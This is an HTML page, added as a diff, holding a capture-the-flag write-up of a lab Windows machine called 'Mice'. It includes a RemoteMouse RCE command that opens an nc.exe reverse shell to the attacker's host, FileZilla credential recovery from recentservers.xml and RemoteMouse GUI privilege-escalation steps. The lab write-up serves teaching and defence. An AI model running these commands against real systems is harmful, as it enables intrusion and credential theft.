@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mice &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Mice</h1>
+    <div class="meta">Target: <code>192.168.114.199</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">RemoteMouse</span><span class="tag">RCE</span><span class="tag">FileZilla</span><span class="tag">CredentialHunting</span><span class="tag">GUI-LPE</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#remotemouse-unauthenticated-rce">RemoteMouse Unauthenticated RCE</a><a class="lvl3" href="#credential-recovery-from-filezilla">Credential Recovery from FileZilla</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#remotemouse-gui-image-transfer-folder-lpe-exploitdb-50047">RemoteMouse GUI, Image Transfer Folder LPE (ExploitDB 50047)</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Mice is a short Windows machine with two interesting twists. The foothold comes from RemoteMouse, a legitimate remote-control app left exposed with a known unauthenticated RCE vulnerability. After landing a shell, credentials for a real user are recovered from a FileZilla saved-servers XML file, and those credentials work over RDP. Privilege escalation then circles back to RemoteMouse itself: a different CVE in the GUI lets a standard user pop a SYSTEM command prompt by abusing the "Image Transfer Folder" dialog, which spawns Explorer with administrator privilege.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE        VERSION
+1978/tcp open  remotemouse    Emote Remote Mouse
+1979/tcp open  unisql-java?
+1980/tcp open  pearldoc-xact?
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+7680/tcp open  pando-pub?
+</code></pre>
+<p>Ports 1978-1980 are the RemoteMouse application's listener ports. RDP on 3389 suggests a real interactive user session is expected. The RemoteMouse signature is the immediate target, it's a well-known vulnerable service.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="remotemouse-unauthenticated-rce">RemoteMouse Unauthenticated RCE</h3>
+<p>RemoteMouse is a tool that lets a phone or tablet control a Windows desktop. Versions up to 3.008 accept unauthenticated commands over the network. The ExploitDB PoC did not work on this target, but the GitHub exploit by p0dalirius did:</p>
+<pre><code class="language-sh">python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.114.199 \
+  -c 'C:\Windows\temp\nc.exe 192.168.45.172 443 -e cmd'
+</code></pre>
+<blockquote>
+<p><strong>How the RemoteMouse RCE works:</strong> the RemoteMouse server receives mouse movement and keyboard commands from its companion mobile app over a simple TCP protocol with no authentication. The exploit sends a crafted "keyboard shortcut" command that causes the server to execute an arbitrary shell command as the logged-in user. No credentials needed, the attack surface is designed for convenience, not security.</p>
+</blockquote>
+<pre><code class="language-sh">sudo rlwrap nc -lvnp 443
+connect to [192.168.45.172]
+
+C:\Windows\temp&gt;whoami
+mice\divine
+</code></pre>
+<h3 id="credential-recovery-from-filezilla">Credential Recovery from FileZilla</h3>
+<p>WinPEAS did not surface obvious escalation paths, so manual enumeration focused on installed applications. FileZilla was present, and FileZilla stores recent server connections, including saved passwords, in plaintext XML:</p>
+<pre><code>C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml
+</code></pre>
+<pre><code class="language-xml">&lt;Server&gt;
+    &lt;Host&gt;ftp.pg&lt;/Host&gt;
+    &lt;User&gt;divine&lt;/User&gt;
+    &lt;Pass encoding=&quot;base64&quot;&gt;Q29udHJvbEZyZWFrMTE=&lt;/Pass&gt;
+    &lt;Logontype&gt;1&lt;/Logontype&gt;
+&lt;/Server&gt;
+</code></pre>
+<blockquote>
+<p><strong>Why FileZilla stores cleartext-equivalent passwords:</strong> FileZilla encodes saved passwords in Base64 with no encryption, which is equivalent to storing them plaintext. Any user who can read the AppData path, or any attacker who gains code execution as that user, can recover all saved FTP credentials instantly. The file's location is well-documented and a standard post-exploitation target.</p>
+</blockquote>
+<p>Decoding the password:</p>
+<pre><code class="language-sh">echo &quot;Q29udHJvbEZyZWFrMTE=&quot; | base64 -d
+‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>divine : ‹redacted›
+</code></pre>
+<p>These worked over RDP:</p>
+<pre><code class="language-sh">xfreerdp /u:&quot;divine&quot; /p:&quot;‹redacted›&quot; /v:192.168.114.199
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="remotemouse-gui-image-transfer-folder-lpe-exploitdb-50047">RemoteMouse GUI, Image Transfer Folder LPE (ExploitDB 50047)</h3>
+<p>The same RemoteMouse app has a separate local privilege escalation: the "Image Transfer Folder" setting in the GUI spawns an Explorer "Save As" dialog with elevated token. By typing a path directly into the dialog's address bar, a user can open any executable, including <code>cmd.exe</code>, with administrator privileges.</p>
+<p>Steps from ExploitDB 50047:</p>
+<ol>
+<li>Open Remote Mouse from the system tray</li>
+<li>Go to Settings</li>
+<li>Click Change in the "Image Transfer Folder" section</li>
+<li>When the Save As prompt appears, enter <code>C:\Windows\System32\cmd.exe</code> in the address bar</li>
+</ol>
+<blockquote>
+<p><strong>Why the dialog inherits elevated privilege:</strong> some GUI components that run embedded in a privileged process (like the RemoteMouse tray service) pass their file-picker dialogs a handle that inherits the calling process's token. When the dialog allows executing a typed path, it does so under the elevated context, effectively letting a standard user chain "open dialog" into "run as admin."</p>
+</blockquote>
+<p>A command prompt spawned with SYSTEM-level access.</p>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code>C:\Windows\System32&gt;whoami
+nt authority\system
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Convenience tools are attack surface.</strong> RemoteMouse runs as a network service with no authentication, by design. Any tool that lets a phone control a computer is one network packet away from RCE.</li>
+<li><strong>FileZilla <code>recentservers.xml</code> is a credential store in disguise.</strong> Base64 is not encryption. Check <code>AppData\Roaming\FileZilla\</code> on every Windows machine you compromise.</li>
+<li><strong>GUI-based LPEs are real.</strong> The RemoteMouse dialog trick looks trivial on paper but produces a SYSTEM shell. Privileged tray apps that spawn file pickers are worth investigating, they sometimes inherit tokens that let standard users escape their privilege boundary.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
